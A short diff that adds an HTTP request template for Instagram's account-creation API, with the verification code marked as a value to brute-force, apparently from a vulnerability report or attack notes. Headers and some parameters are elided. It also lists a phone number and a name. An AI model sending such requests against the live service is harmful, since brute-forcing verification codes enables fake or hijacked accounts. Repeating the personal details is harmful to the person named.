@@ -1,1 +1,13 @@
 
+POST /api/v1/accounts/create_validated/ HTTP/
+Host: i.instagram.com
+---Other headers
+
+signed_body=SIGNATURE.{
+"verification_code": "CODE_TO_BRUTE_FORCE",
+"enc_password": "ENCRYPTED_PASS",
+"phone_number": "01876602870",
+"username": "foysal akanda",
+"first_name": "foysal",
+----other params
+}
